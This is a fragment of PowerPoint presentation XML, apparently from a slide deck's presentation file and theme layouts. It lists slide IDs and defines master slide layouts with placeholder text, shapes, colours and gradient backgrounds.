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 id="2147483658" r:id="rId5"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId59"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId6"/>
    <p:sldId id="257" r:id="rId7"/>
    <p:sldId id="261" r:id="rId8"/>
    <p:sldId id="313" r:id="rId9"/>
    <p:sldId id="407" r:id="rId10"/>
    <p:sldId id="408" r:id="rId11"/>
    <p:sldId id="400" r:id="rId12"/>
    <p:sldId id="409" r:id="rId13"/>
    <p:sldId id="410" r:id="rId14"/>
    <p:sldId id="411" r:id="rId15"/>
    <p:sldId id="412" r:id="rId16"/>
    <p:sldId id="414" r:id="rId17"/>
    <p:sldId id="413" r:id="rId18"/>
    <p:sldId id="415" r:id="rId19"/>
    <p:sldId id="416" r:id="rId20"/>
    <p:sldId id="402" r:id="rId21"/>
    <p:sldId id="419" r:id="rId22"/>
    <p:sldId id="420" r:id="rId23"/>
    <p:sldId id="421" r:id="rId24"/>
    <p:sldId id="417" r:id="rId25"/>
    <p:sldId id="418" r:id="rId26"/>
    <p:sldId id="422" r:id="rId27"/>
    <p:sldId id="423" r:id="rId28"/>
    <p:sldId id="424" r:id="rId29"/>
    <p:sldId id="425" r:id="rId30"/>
    <p:sldId id="426" r:id="rId31"/>
    <p:sldId id="427" r:id="rId32"/>
    <p:sldId id="428" r:id="rId33"/>
    <p:sldId id="429" r:id="rId34"/>
    <p:sldId id="430" r:id="rId35"/>
    <p:sldId id="431" r:id="rId36"/>
    <p:sldId id="403" r:id="rId37"/>
    <p:sldId id="433" r:id="rId38"/>
    <p:sldId id="434" r:id="rId39"/>
    <p:sldId id="432" r:id="rId40"/>
    <p:sldId id="435" r:id="rId41"/>
    <p:sldId id="436" r:id="rId42"/>
    <p:sldId id="437" r:id="rId43"/>
    <p:sldId id="438" r:id="rId44"/>
    <p:sldId id="405" r:id="rId45"/>
    <p:sldId id="439" r:id="rId46"/>
    <p:sldId id="440" r:id="rId47"/>
    <p:sldId id="441" r:id="rId48"/>
    <p:sldId id="443" r:id="rId49"/>
    <p:sldId id="444" r:id="rId50"/>
    <p:sldId id="445" r:id="rId51"/>
    <p:sldId id="446" r:id="rId52"/>
    <p:sldId id="447" r:id="rId53"/>
    <p:sldId id="448" r:id="rId54"/>
    <p:sldId id="449" r:id="rId55"/>
    <p:sldId id="450" r:id="rId56"/>
    <p:sldId id="353" r:id="rId57"/>
    <p:sldId id="442"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00FF"/>
    <a:srgbClr val="FFFF00"/>
    <a:srgbClr val="260A8E"/>
    <a:srgbClr val="FFD3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184" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="70" d="100"/>
          <a:sy n="70" d="100"/>
        </p:scale>
        <p:origin x="6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9B0E6-B9BF-4E2D-AE08-8C7EBB196A2E}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9/6/2025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3816F-A1CF-4485-B308-1B9F14B36EAD}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1726839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0C5E7-B1A1-4648-89D2-17B0F1E7F5B3}"/>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5D140298-3E00-4E73-B947-697E692828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A6BB99EB-0E86-4FEA-A9C4-501D4E755A2B}"/>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6731F536-58DF-4935-AE3B-7A08C03124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995127-BE30-42B7-9BE5-B83CC6A2E685}"/>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00975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E108-9C7F-4CDC-AD71-B576580A199F}"/>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5A103746-779A-435F-995A-5BF82C86C297}"/>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5984E866-B322-455F-AC32-8C164B8CD9C7}"/>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AC0D61E0-F80F-48E7-A817-F1CECBEE9A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BF34AFC-4299-43F1-A312-79EF0102CEFF}"/>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55274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E1D3E-E4B6-4EAA-BFB4-25A0557A6CB8}"/>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6F7E0856-45A8-4EAD-A9D6-8A993968A1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E90EEBE1-2BAF-4C94-8403-6E8454F9BC4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F3358F46-E931-4D79-94A5-037AFD07333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130D95-EF5F-4A0A-93BD-73AEE2C2FF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60125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BEC0-6253-4360-B586-B9D20933DE37}"/>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A946E20B-8661-4C60-84FB-4892E8B48608}"/>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5132BE45-79E4-479B-BD2F-46CCB0BEE628}"/>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0589105E-DF25-4F38-BDE2-9B00C2C44FC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B1D9C4A8-7467-4BAD-98A2-0B63CAC19B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C5C5C0-08E4-4F7B-9E80-8925539D22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243840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F641-A5CC-4263-A394-2112D623A8AD}"/>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B24D6865-C632-473C-AEC8-8D3F71562B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D9FDBD19-4D33-4F6A-9938-6A04B3888ECC}"/>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51697E46-CE4D-480E-A997-2B53B2DF55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8B8B7E36-823F-4FD4-B826-E450A1248008}"/>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8DBB3B14-C886-4F84-9FD5-11C8320E1FED}"/>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8" name="Footer Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF9AF591-4BBF-4BF2-9EF7-F8B114DFA16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52B1A04-B244-4AE3-8997-9B075B10597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1104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08F1-BB29-4C6F-91C9-653A730BECC6}"/>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2F54FEF9-8D09-4091-BE99-B6264EBD34B3}"/>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4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B5F49AA-83D5-4063-9CDE-AA7763048B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2A2B27C-3C99-4208-B425-775413C5365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6140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2A62B2-A6D1-4A6F-8B20-80606F478544}"/>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3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C02E4958-7A46-4331-B2D8-2C31D8FCBD7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C8548B-339B-46B2-BF01-1EE3DDC72AA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91466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408F-8083-4F07-9628-074C7AFE41C0}"/>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B70477E0-A333-439D-A531-30B39A8134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D5D59501-D187-414C-AACE-F83872003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1235F890-BB8A-49E1-880A-924FD6FE402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51CA38FE-429A-41E7-942D-ECCE639D3CA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401D9BC-0038-4041-AE2C-657BF99D41E9}"/>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28756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6CFD-7F35-482C-A50F-B3D43ACB0AE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7FD7F3EF-0FE9-46C4-A116-5DA6E26B0D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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D10B4041-0F17-42D8-AF16-AB099A39F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8BAF67FF-F8F1-4B22-A471-9317ED3A25F0}"/>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A73D6993-98F8-4234-B24A-02D4DB41CE9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2A34037-0E7D-4379-ACA0-98611B2F76E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93919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15128" y="1397977"/>
            <a:ext cx="8361229" cy="3007447"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:defRPr sz="66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679906" y="4475023"/>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79965FD7-DA9A-4AFB-B8C8-34AC1FEE9F72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="887674" y="726883"/>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5" name="L-Shape 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92465177-72B9-4DCF-8F98-0C79F3EE32EC}"/>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4408489"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 6149"/>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8" y="1685652"/>
            <a:ext cx="3152309" cy="4408489"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 6773"/>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3397854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Second Option">
    <p:bg bwMode="grayWhite">
      <p:bgPr>
        <a:gradFill flip="none" rotWithShape="1">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="tx2">
                <a:lumMod val="50000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="34000">
              <a:schemeClr val="tx2"/>
            </a:gs>
            <a:gs pos="66000">
              <a:schemeClr val="tx2">
                <a:lumMod val="75000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="97000">
              <a:schemeClr val="tx2">
                <a:lumMod val="50000"/>
              </a:schemeClr>
            </a:gs>
          </a:gsLst>
          <a:lin ang="2700000" scaled="1"/>
          <a:tileRect/>
        </a:gradFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="L-Shape 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13412040-642F-40C5-8AB5-C0E8D41B481B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="870090" y="709300"/>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9" name="Rectangle 8" title="Side bar">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BADD331D-DA8D-4D47-A2BB-F4875FDB16A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5791174" y="457175"/>
            <a:ext cx="609651" cy="1219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1397977" y="1151796"/>
            <a:ext cx="9504485" cy="3007447"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:defRPr sz="6600" cap="none" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0"/>
              <a:t>Click To Edit Master Title Style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1397977" y="4897053"/>
            <a:ext cx="9504485"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bg1"/>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bg1"/>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11" name="L-Shape 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68D376A1-CC76-4C90-B2CF-F89EA13E7942}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="8549910" y="1820273"/>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3007448"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 6089"/>
              <a:gd name="adj2" fmla="val 6769"/>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7" y="1685653"/>
            <a:ext cx="3152309" cy="3007448"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 6089"/>
              <a:gd name="adj2" fmla="val 6442"/>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315900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720213"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4800"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0"/>
              <a:t>Click To Edit Master Title Style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="1484671"/>
            <a:ext cx="9601200" cy="4382729"/>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7" name="Straight Connector 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBEFB83C-E1EC-41AC-BFF6-9D094E2D43C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1465008" y="1445344"/>
            <a:ext cx="9468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754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and Picture">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7" name="Oval 26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C222C1B9-FA56-4CEA-AD98-25A595D942F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="white">
          <a:xfrm>
            <a:off x="7040199" y="564425"/>
            <a:ext cx="4356000" cy="4464000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="123825">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solid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Picture Placeholder 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9786B981-6A78-425B-97A2-BA24E40DB7AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7145761" y="670570"/>
            <a:ext cx="4151312" cy="4248000"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="bg2"/>
            </a:solidFill>
          </a:ln>
          <a:effectLst>
            <a:innerShdw blurRad="114300">
              <a:prstClr val="black"/>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Click icon to add picture</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Content Placeholder 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A21C7D74-31FD-4638-819B-6F7351A1770B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6747294" y="5188236"/>
            <a:ext cx="4858459" cy="1126906"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:innerShdw blurRad="114300">
              <a:prstClr val="black"/>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="530352" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="987552" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1444752" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1901952" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1400">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50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473639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8" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED439475-E625-4449-B42E-8F291D64A3C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6695360" y="518474"/>
            <a:ext cx="4910394" cy="5759777"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:innerShdw blurRad="114300">
              <a:prstClr val="black"/>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:defRPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:defRPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:defRPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:defRPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Edit Master text styles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="1" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Second level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="2" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Third level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="3" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Fourth level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="4" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1350508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Picture, TItle, and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1F430D42-50DC-4502-A3E8-251FE7F0809D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="507591" y="5289755"/>
            <a:ext cx="5270049" cy="101272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6923C"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>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4732985"/>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0" name="Picture Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3BDA3A4D-2561-4EEB-8787-E1A652565755}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="806245" y="668595"/>
            <a:ext cx="4646651" cy="4198373"/>
          </a:xfrm>
          <a:prstGeom prst="snip2DiagRect">
            <a:avLst>
              <a:gd name="adj1" fmla="val 0"/>
              <a:gd name="adj2" fmla="val 10300"/>
            </a:avLst>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
          </a:ln>
          <a:effectLst>
            <a:innerShdw blurRad="114300">
              <a:prstClr val="black"/>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Click icon to add picture</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text Placeholder 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBB32A6B-92AA-4208-9120-FFC166CE751C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="570275" y="5352418"/>
            <a:ext cx="5148000" cy="900000"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:effectLst>
            <a:innerShdw blurRad="114300">
              <a:prstClr val="black">
                <a:alpha val="34000"/>
              </a:prstClr>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="530352" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="987552" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1444752" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1901952" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1400">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>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010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5945780"/>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9" name="Picture Placeholder 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D57F3340-8A42-40F0-BF5B-EEF6E3E88E6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="806246" y="668595"/>
            <a:ext cx="4646651" cy="5383413"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 4646651"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 5383413"/>
              <a:gd name="connsiteX1" fmla="*/ 4168046 w 4646651"/>
              <a:gd name="connsiteY1" fmla="*/ 0 h 5383413"/>
              <a:gd name="connsiteX2" fmla="*/ 4646651 w 4646651"/>
              <a:gd name="connsiteY2" fmla="*/ 478605 h 5383413"/>
              <a:gd name="connsiteX3" fmla="*/ 4646651 w 4646651"/>
              <a:gd name="connsiteY3" fmla="*/ 5383413 h 5383413"/>
              <a:gd name="connsiteX4" fmla="*/ 478605 w 4646651"/>
              <a:gd name="connsiteY4" fmla="*/ 5383413 h 5383413"/>
              <a:gd name="connsiteX5" fmla="*/ 0 w 4646651"/>
              <a:gd name="connsiteY5" fmla="*/ 4904808 h 538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6651" h="5383413">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4168046" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4646651" y="478605"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4646651" y="5383413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478605" y="5383413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4904808"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln w="57150">
